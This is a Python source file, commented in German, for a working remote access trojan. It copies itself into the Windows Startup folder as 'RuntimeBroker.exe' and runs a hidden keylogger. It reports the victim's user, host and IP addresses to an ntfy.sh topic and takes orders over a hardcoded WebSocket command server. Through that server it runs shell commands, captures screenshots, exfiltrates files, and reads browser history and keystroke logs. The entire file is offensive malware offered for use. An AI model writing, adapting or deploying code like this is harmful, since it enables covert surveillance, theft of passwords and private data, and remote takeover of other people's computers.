import asyncio
import websockets
import json
import subprocess
import os
import base64
import mss
import platform
import sqlite3
import shutil
import sys
import socket
import urllib.request
import glob
from datetime import datetime, timedelta

# pynput wird für den Keylogger benötigt
try:
    from pynput import keyboard
except ImportError:
    print("[!] pynput ist nicht installiert. Keylogger-Funktion nicht verfügbar.")
    keyboard = None

SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
NTFY_TOPIC = "RAT_JundN"

# --- Systeminformationsfunktionen ---
def get_public_ip():
    try:
        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
    except Exception:
        return "Unbekannt"

def get_local_ips():
    try:
        hostname = socket.gethostname()
        return ", ".join(socket.gethostbyname_ex(hostname)[2])
    except Exception:
        return "Unbekannt"

def send_ntfy_notification():
    try:
        system_info = (
            f"Neue RAT-Verbindung!\n"
            f"Benutzer: {os.getlogin()}\n"
            f"Hostname: {socket.gethostname()}\n"
            f"OS: {platform.platform()}\n"
            f"Öffentliche IP: {get_public_ip()}\n"
            f"Lokale IPs: {get_local_ips()}\n"
            f"RAT-URL: {SERVER_URI}"
        )
        
        req = urllib.request.Request(
            f"https://ntfy.sh/{NTFY_TOPIC}",
            data=system_info.encode('utf-8'),
            headers={
                "Title": "RAT Aktivierung",
                "Priority": "urgent",
                "Tags": "warning,skull"
            }
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"[!] Fehler beim Senden der NTFY-Benachrichtigung: {e}")

# --- Keylogger-Funktionen ---
def on_press_persistent(key):
    special_key_map = {
        keyboard.Key.enter: f" [<<<{datetime.now().strftime('%H:%M:%S')}>>>]\n",
        keyboard.Key.space: " ",
        keyboard.Key.backspace: "[BS]",
        keyboard.Key.tab: "[Tab]",
        keyboard.Key.ctrl: "[CTRL]",
        keyboard.Key.ctrl_l: "[CTRL]",
        keyboard.Key.ctrl_r: "[CTRL]",
        keyboard.Key.alt: "[ALT]",
        keyboard.Key.alt_l: "[ALT]",
        keyboard.Key.alt_r: "[ALT]",
        keyboard.Key.shift: "",
        keyboard.Key.shift_l: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.cmd: "[CMD]",
        keyboard.Key.cmd_l: "[CMD]",
        keyboard.Key.cmd_r: "[CMD]",
        keyboard.Key.esc: "[ESC]",
        keyboard.Key.up: "[UP]",
        keyboard.Key.down: "[DOWN]",
        keyboard.Key.left: "[LEFT]",
        keyboard.Key.right: "[RIGHT]",
        keyboard.Key.delete: "[DEL]",
        keyboard.Key.insert: "[INS]",
    }
    log_entry = ""
    try:
        log_entry = key.char
    except AttributeError:
        log_entry = special_key_map.get(key, f"[{key.name}]")
    if log_entry:
        try:
            with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception:
            pass

def start_persistent_keylogger():
    if not keyboard:
        return
    header = f"\n--- SESSION STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
    try:
        with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
            f.write(header)
    except Exception as e:
        print(f"[!] Fehler beim Schreiben des Log-Headers: {e}")
    listener = keyboard.Listener(on_press=on_press_persistent)
    listener.daemon = True
    listener.start()
    print(f"[+] Persistenter Keylogger gestartet. Log-Datei: {KEYLOG_FILE_PATH}")

# --- Persistenzfunktion ---
def ensure_persistence():
    if platform.system() != "Windows":
        return
    startup_filename = "RuntimeBroker.exe"
    source_path = sys.executable
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    dest_path = os.path.join(startup_folder, startup_filename)
    if source_path.lower() == dest_path.lower():
        return
    if not os.path.exists(dest_path):
        try:
            os.makedirs(startup_folder, exist_ok=True)
            shutil.copyfile(source_path, dest_path)
        except Exception:
            pass

# --- Browserverlauf-Funktion (erweitert für mehrere Browser) ---
def get_browser_history(limit=50):
    browsers = {
        "Chrome": {
            "windows": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'),
            "linux": os.path.join(os.path.expanduser('~'), '.config', 'google-chrome', 'Default', 'History'),
            "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History')
        },
        "Edge": {
            "windows": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
            "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Microsoft Edge', 'Default', 'History')
        },
        "Firefox": {
            "windows": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
            "linux": os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox'),
            "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox', 'Profiles')
        }
    }

    system = platform.system().lower()
    if system == "windows":
        system = "windows"
    elif system == "linux":
        system = "linux"
    elif system == "darwin":
        system = "mac"

    output = []
    
    for browser, paths in browsers.items():
        if system not in paths:
            continue
            
        db_path = paths[system]
        
        # Firefox benötigt spezielle Behandlung
        if browser == "Firefox":
            profile_paths = glob.glob(os.path.join(db_path, '*.default*'))
            if not profile_paths:
                continue
            db_path = os.path.join(profile_paths[0], 'places.sqlite')
        elif not os.path.exists(db_path):
            continue
            
        temp_db_path = f"{browser}_history_temp.db"
        try:
            shutil.copyfile(db_path, temp_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            if browser in ["Chrome", "Edge"]:
                query = f"""
                SELECT url, title, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT {limit}
                """
            else:  # Firefox
                query = f"""
                SELECT url, title, last_visit_date 
                FROM moz_places 
                JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id 
                ORDER BY last_visit_date DESC 
                LIMIT {limit}
                """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            def convert_time(timestamp):
                if browser in ["Chrome", "Edge"]:
                    return (datetime(1601, 1, 1) + timedelta(microseconds=timestamp)).strftime('%d.%m.%Y %H:%M:%S')
                else:  # Firefox
                    return (datetime.fromtimestamp(timestamp/1000000)).strftime('%d.%m.%Y %H:%M:%S')
            
            browser_output = [f"\n=== {browser} Verlauf (letzte {len(results)} Einträge) ==="]
            for i, (url, title, visit_time) in enumerate(results, 1):
                try:
                    browser_output.append(
                        f"Eintrag {i}:\n"
                        f"  Zeit:    {convert_time(visit_time)}\n"
                        f"  Titel:   {title}\n"
                        f"  URL:     {url}\n" +
                        "-" * 40
                    )
                except Exception:
                    continue
            
            output.extend(browser_output)
            
        except sqlite3.Error as e:
            output.append(f"[FEHLER] {browser} Verlauf konnte nicht gelesen werden: {str(e)}")
        finally:
            if 'conn' in locals():
                conn.close()
            if os.path.exists(temp_db_path):
                os.remove(temp_db_path)
    
    return "\n".join(output) if output else "Keine Browserverläufe gefunden."

# --- Hauptlogik ---
async def process_commands(websocket):
    async for message in websocket:
        try:
            command = json.loads(message)
            action = command.get("action")
            response = {"status": "ok"}
            
            if action == "exec":
                cmd_to_run = command.get("command")
                result = subprocess.run(
                    cmd_to_run,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="ignore",
                )
                response["type"] = "command_output"
                response["output"] = result.stdout + result.stderr
            
            elif action == "screenshot":
                with mss.mss() as sct:
                    sct.shot(output="screenshot.png")
                    with open("screenshot.png", "rb") as img_file:
                        encoded_string = base64.b64encode(
                            img_file.read()
                        ).decode("utf-8")
                    os.remove("screenshot.png")
                    response["type"] = "screenshot"
                    response["data"] = encoded_string
            
            elif action == "download":
                path = command.get("path")
                if os.path.exists(path) and os.path.isfile(path):
                    with open(path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    response["type"] = "file_download"
                    response["filename"] = os.path.basename(path)
                    response["data"] = file_data
                else:
                    response["status"] = "error"
                    response["error"] = "Datei nicht gefunden oder ist ein Verzeichnis."
            
            elif action == "history":
                limit = command.get("limit", 50)  # Standard: 50 Einträge
                response["type"] = "command_output"
                response["output"] = get_browser_history(limit)
            
            elif action == "keylogger":
                if not keyboard:
                    response["status"] = "error"
                    response["error"] = "pynput ist auf dem Client nicht installiert."
                elif not os.path.exists(KEYLOG_FILE_PATH):
                    response["type"] = "command_output"
                    response["output"] = "Keylog-Datei existiert noch nicht."
                else:
                    count = command.get("count", 1000)
                    with open(KEYLOG_FILE_PATH, "rb") as f:
                        f.seek(0, os.SEEK_END)
                        filesize = f.tell()
                        seek_pos = max(0, filesize - int(count * 1.5))
                        f.seek(seek_pos)
                        last_chunk = f.read().decode("utf-8", errors="ignore")
                        output = last_chunk[-count:]
                    response["type"] = "command_output"
                    response["output"] = (
                        f"Die letzten {len(output)} Zeichen aus der Log-Datei "
                        f"({filesize / 1024:.2f} KB):\n{output}"
                    )
            else:
                response["status"] = "error"
                response["error"] = "Unbekannte Aktion"
            
            await websocket.send(json.dumps(response))
        except Exception as e:
            error_response = {"status": "error", "error": f"Client-Fehler: {e}"}
            try:
                await websocket.send(json.dumps(error_response))
            except Exception:
                pass

async def connect_to_server():
    ensure_persistence()
    start_persistent_keylogger()
    send_ntfy_notification()  # Sende Systeminformationen bei Start
    
    while True:
        try:
            async with websockets.connect(SERVER_URI) as websocket:
                print("[+] Verbunden mit dem Server.")
                await process_commands(websocket)
        except (websockets.ConnectionClosed, ConnectionRefusedError):
            await asyncio.sleep(10)
        except Exception:
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(connect_to_server())